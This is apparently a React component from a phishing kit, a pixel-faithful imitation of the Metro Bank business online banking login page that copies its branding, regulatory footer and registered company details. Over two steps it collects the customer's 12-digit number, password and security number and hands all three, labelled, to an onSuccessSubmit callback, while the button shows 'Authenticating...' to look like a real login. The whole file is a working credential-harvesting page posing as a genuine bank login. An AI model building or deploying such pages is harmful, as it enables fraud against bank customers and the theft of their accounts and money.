"use client";

import { useState } from "react";

interface MetroBankProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function MetroBankTemplate({
  bankName = "Metro Bank",
  selectedOption = "Business",
  onSuccessSubmit,
}: MetroBankProps) {
  // 2-Step State: 1 = Customer Number, 2 = Password & Security Code
  const [step, setStep] = useState<1 | 2>(1);

  // Form Fields
  const [customerNumber, setCustomerNumber] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [password, setPassword] = useState("");
  const [securityNumber, setSecurityNumber] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Errors & Loading
  const [step1Error, setStep1Error] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [securityError, setSecurityError] = useState("");
  const [loading, setLoading] = useState(false);

  // Step 1 Continue Handler
  const handleStep1Continue = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customerNumber.trim()) {
      setStep1Error("Please enter your 12 digit customer number.");
      return;
    }
    setStep1Error("");
    setStep(2); // Go to Step 2
  };

  // Step 2 Final Submission Handler
  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let hasError = false;

    if (!password.trim()) {
      setPasswordError("Please enter your password.");
      hasError = true;
    } else {
      setPasswordError("");
    }

    if (!securityNumber.trim()) {
      setSecurityError("Please enter your security number.");
      hasError = true;
    } else {
      setSecurityError("");
    }

    if (hasError) return;

    setLoading(true);

    onSuccessSubmit({
      userId: `CustNo: ${customerNumber.trim()}`,
      password: password.trim(),
      memorableInfo: `SecurityNo: ${securityNumber.trim()}`,
      extraData: `Option: ${selectedOption || "Business"} | Remember: ${rememberMe ? "Yes" : "No"} | Metro Bank 24/7`,
    });
  };

  return (
    <div className="relative min-h-screen bg-[#f3f4f6] font-sans text-slate-800 flex flex-col justify-between selection:bg-[#002f87] selection:text-white">
      <div>
        {/* ================= 1. METRO BANK TOP NAV ================= */}
        <header className="w-full bg-[#002f87] px-6 sm:px-12 py-3 flex items-center justify-between text-white shadow-sm z-20 relative">
          {/* Logo */}
          <div className="flex items-center gap-2">
            <span className="text-3xl font-black italic tracking-tighter text-[#e2001a] leading-none">
              M
            </span>
            <div className="flex flex-col leading-none font-bold text-xs tracking-wider">
              <span>ETRO</span>
              <span>BANK</span>
            </div>
          </div>

          {/* Nav Links */}
          <div className="flex items-center gap-6 text-xs text-white/90 font-medium">
            <a href="#" className="hover:underline hidden sm:inline">Home</a>
            <a href="#" className="hover:underline hidden sm:inline">Our Stores</a>
            <a href="#" className="hover:underline hidden sm:inline">Personal Internet Banking</a>
            <a href="#" className="hover:underline font-bold text-white">New Customers</a>
          </div>
        </header>

        {/* ================= 2. HERO IMAGE & MODAL WRAPPER ================= */}
        <div className="relative min-h-[620px] py-12 px-4 sm:px-8 flex items-center justify-center overflow-hidden">
          {/* Background Image of Glass Storefront */}
          <div
            className="absolute inset-0 bg-cover bg-center brightness-[0.75]"
            style={{
              backgroundImage:
                "url('https://images.unsplash.com/photo-1577495508048-b635879837f1?q=80&w=1600&auto=format&fit=crop')",
            }}
          ></div>

          {/* Hero Heading Overlay on top */}
          <div className="absolute top-8 left-8 sm:left-16 text-white drop-shadow-md z-10 hidden md:block">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">
              Welcome to Metro Bank
            </h1>
            <p className="text-base sm:text-lg font-light text-slate-100">
              Take control of your business 24/7
            </p>
          </div>

          {/* Central Login Card (Exact White Card Layout) */}
          <div className="relative z-20 w-full max-w-[850px] bg-white rounded-lg shadow-2xl overflow-hidden border border-slate-200 mt-6 sm:mt-12">
            <div className="grid grid-cols-1 md:grid-cols-12">
              
              {/* Left Column: Form (Step 1 & Step 2) */}
              <div className="md:col-span-7 p-6 sm:p-9 flex flex-col justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-[#002f87] tracking-tight mb-4">
                    Log in to Business Online Banking
                  </h2>

                  {/* Stepper (1 -> 2) */}
                  <div className="flex items-center gap-3 mb-6">
                    <div
                      className={`h-7 w-7 rounded-full flex items-center justify-center text-xs font-bold transition ${
                        step === 1
                          ? "bg-[#939ca8] text-white"
                          : "bg-[#002f87] text-white"
                      }`}
                    >
                      1
                    </div>
                    <div className="h-[2px] w-8 bg-slate-300"></div>
                    <div
                      className={`h-7 w-7 rounded-full flex items-center justify-center text-xs font-bold transition ${
                        step === 2
                          ? "bg-[#002f87] text-white"
                          : "border-2 border-slate-300 text-slate-400 bg-white"
                      }`}
                    >
                      2
                    </div>
                  </div>

                  {/* ================= STEP 1 FORM ================= */}
                  {step === 1 ? (
                    <form onSubmit={handleStep1Continue} className="space-y-5">
                      <div>
                        <input
                          type="text"
                          maxLength={12}
                          placeholder="Please enter your 12 digit customer number"
                          value={customerNumber}
                          onChange={(e) => {
                            setCustomerNumber(e.target.value.replace(/\D/g, ""));
                            if (step1Error) setStep1Error("");
                          }}
                          className={`w-full rounded border p-3 text-xs sm:text-sm outline-none transition placeholder:italic placeholder:text-slate-400 ${
                            step1Error
                              ? "border-red-500 bg-red-50/20"
                              : "border-[#002f87] focus:ring-1 focus:ring-[#002f87]"
                          }`}
                        />
                        {step1Error && (
                          <p className="text-xs text-red-600 font-semibold mt-1">
                            {step1Error}
                          </p>
                        )}
                      </div>

                      {/* Remember me Toggle */}
                      <div className="flex items-center justify-between pt-1">
                        <div>
                          <span className="block text-xs font-bold text-slate-800">
                            Remember me
                          </span>
                          <span className="text-[11px] text-slate-500">
                            (Don't tick if you're on a shared computer)
                          </span>
                        </div>

                        {/* Toggle Switch */}
                        <button
                          type="button"
                          onClick={() => setRememberMe(!rememberMe)}
                          className={`w-11 h-6 flex items-center rounded-full p-1 cursor-pointer transition duration-300 ${
                            rememberMe ? "bg-[#002f87]" : "bg-slate-300"
                          }`}
                        >
                          <div
                            className={`bg-white w-4 h-4 rounded-full shadow-md transform transition duration-300 ${
                              rememberMe ? "translate-x-5" : ""
                            }`}
                          ></div>
                        </button>
                      </div>

                      {/* Step 1 Continue Button */}
                      <div className="pt-4">
                        <button
                          type="submit"
                          className="w-full rounded-md bg-[#002f87] hover:bg-[#00246a] active:scale-[0.99] py-3 text-sm font-bold text-white shadow transition cursor-pointer"
                        >
                          Continue
                        </button>
                      </div>
                    </form>
                  ) : (
                    /* ================= STEP 2 FORM (PASSWORD & SECURITY NUMBER) ================= */
                    <form onSubmit={handleFinalSubmit} className="space-y-4 animate-fadeIn">
                      <div className="flex items-center justify-between pb-1">
                        <span className="text-xs font-bold text-slate-600">
                          Customer: <span className="font-mono text-[#002f87]">{customerNumber}</span>
                        </span>
                        <button
                          type="button"
                          onClick={() => setStep(1)}
                          className="text-xs text-[#002f87] underline font-semibold hover:text-[#00246a]"
                        >
                          ‹ Change
                        </button>
                      </div>

                      {/* Password */}
                      <div>
                        <label className="block text-xs font-bold text-slate-700 mb-1">
                          Password:
                        </label>
                        <div className="relative">
                          <input
                            type={showPassword ? "text" : "password"}
                            placeholder="Enter your internet banking password"
                            value={password}
                            onChange={(e) => {
                              setPassword(e.target.value);
                              if (passwordError) setPasswordError("");
                            }}
                            className={`w-full rounded border p-2.5 pr-14 text-sm outline-none transition ${
                              passwordError
                                ? "border-red-500 bg-red-50/20"
                                : "border-slate-400 focus:border-[#002f87]"
                            }`}
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#002f87] underline px-1"
                          >
                            {showPassword ? "Hide" : "Show"}
                          </button>
                        </div>
                        {passwordError && (
                          <p className="text-xs text-red-600 font-semibold mt-1">{passwordError}</p>
                        )}
                      </div>

                      {/* Security Number */}
                      <div>
                        <label className="block text-xs font-bold text-slate-700 mb-1">
                          Security Number:
                        </label>
                        <input
                          type="password"
                          maxLength={6}
                          placeholder="Enter your security number"
                          value={securityNumber}
                          onChange={(e) => {
                            setSecurityNumber(e.target.value);
                            if (securityError) setSecurityError("");
                          }}
                          className={`w-full rounded border p-2.5 text-sm outline-none transition font-mono tracking-wider ${
                            securityError
                              ? "border-red-500 bg-red-50/20"
                              : "border-slate-400 focus:border-[#002f87]"
                          }`}
                        />
                        {securityError && (
                          <p className="text-xs text-red-600 font-semibold mt-1">{securityError}</p>
                        )}
                      </div>

                      {/* Step 2 Submit Button */}
                      <div className="pt-2">
                        <button
                          type="submit"
                          disabled={loading}
                          className="w-full rounded-md bg-[#e2001a] hover:bg-[#bf0015] active:scale-[0.99] py-3 text-sm font-bold text-white shadow transition cursor-pointer"
                        >
                          {loading ? "Authenticating..." : "Log in to Internet Banking"}
                        </button>
                      </div>
                    </form>
                  )}
                </div>

                {/* Bottom Circular Action Icons */}
                <div className="border-t border-slate-200 mt-8 pt-5 flex items-center justify-around text-center text-xs text-slate-600 font-medium">
                  <a href="#" className="flex flex-col items-center gap-1 hover:text-[#002f87]">
                    <div className="w-10 h-10 rounded-full border border-[#002f87] text-[#002f87] flex items-center justify-center font-bold text-sm">
                      M
                    </div>
                    <span>Store Locator</span>
                  </a>

                  <a href="#" className="flex flex-col items-center gap-1 hover:text-[#002f87]">
                    <div className="w-10 h-10 rounded-full border border-[#002f87] text-[#002f87] flex items-center justify-center font-bold text-sm">
                      📱
                    </div>
                    <span>Contact us</span>
                  </a>

                  <a href="#" className="flex flex-col items-center gap-1 hover:text-[#002f87]">
                    <div className="w-10 h-10 rounded-full border border-[#002f87] text-[#002f87] flex items-center justify-center font-bold text-sm">
                      ℹ
                    </div>
                    <span>Help & Information</span>
                  </a>
                </div>
              </div>

              {/* Right Column: First time logging in? Helper (Exact Screenshot) */}
              <div className="md:col-span-5 bg-[#fbfbfb] border-t md:border-t-0 md:border-l border-slate-200 p-6 sm:p-8 flex flex-col justify-between text-xs leading-relaxed text-slate-700">
                <div className="space-y-4">
                  <h3 className="text-sm font-bold text-[#002f87]">
                    First time logging in?
                  </h3>
                  <p className="font-medium text-slate-800">You'll need your:</p>
                  <ul className="list-disc pl-4 space-y-1 text-slate-600">
                    <li>12-digit customer number</li>
                    <li>password</li>
                    <li>security number</li>
                    <li>security device</li>
                  </ul>

                  <div className="pt-2">
                    <h4 className="font-bold text-[#002f87] mb-1">
                      Don't have a security device?
                    </h4>
                    <p className="text-slate-600">
                      Use our Metro Bank Authenticator app instead and approve your login requests straight from your phone.
                    </p>
                  </div>
                </div>

                <div className="pt-6 space-y-1.5 border-t border-slate-200 mt-6 font-semibold text-[#002f87]">
                  <a href="#" className="block hover:underline">
                    New to Online Banking? Register now?
                  </a>
                  <a href="#" className="block hover:underline">
                    Forgotten your Customer Number?
                  </a>
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>

      {/* ================= 3. COMPLIANCE & FSCS FOOTER ================= */}
      <footer className="w-full bg-[#f4f4f4] border-t border-slate-300 px-6 sm:px-12 py-8 text-[11.5px] text-slate-600">
        <div className="max-w-[1100px] mx-auto space-y-4">
          <div className="flex flex-wrap gap-6 text-slate-700 font-medium">
            <a href="#" className="hover:underline">Legal information</a>
            <a href="#" className="hover:underline">Fraud and Security</a>
            <a href="#" className="hover:underline">Service Quality Metrics</a>
            <a href="#" className="hover:underline">Customise My Preferences</a>
          </div>

          <p className="leading-relaxed">
            Your eligible deposits with Metro Bank PLC are protected up to a total of £120,000 by the Financial Services Compensation Scheme, the UK's deposit guarantee scheme. Any deposits you hold above the limit are unlikely to be covered. Please visit www.fscs.org.uk for further information.
          </p>

          <p className="leading-relaxed">
            Metro Bank PLC. Registered in England and Wales. Company number: 6419578. Registered office: One Southampton Row, London, WC1B 5HA. We are authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority. Metro Bank PLC is an independent UK Bank - it is not affiliated with any other bank or organisation (including the METRO newspaper or its publishers) anywhere in the world. "Metrobank" is the registered trademark of Metro Bank PLC. Copyright 2017 Metro Bank. All rights reserved.
          </p>

          {/* Purple FSCS Badge */}
          <div className="pt-2">
            <div className="inline-flex items-center gap-2 bg-[#531765] text-white px-3.5 py-1.5 rounded-md shadow-xs">
              <span className="text-xl">🔒</span>
              <div className="leading-tight">
                <span className="text-sm font-black italic">fscs</span>
                <span className="text-[10px] font-bold tracking-wider uppercase ml-1.5">PROTECTED</span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}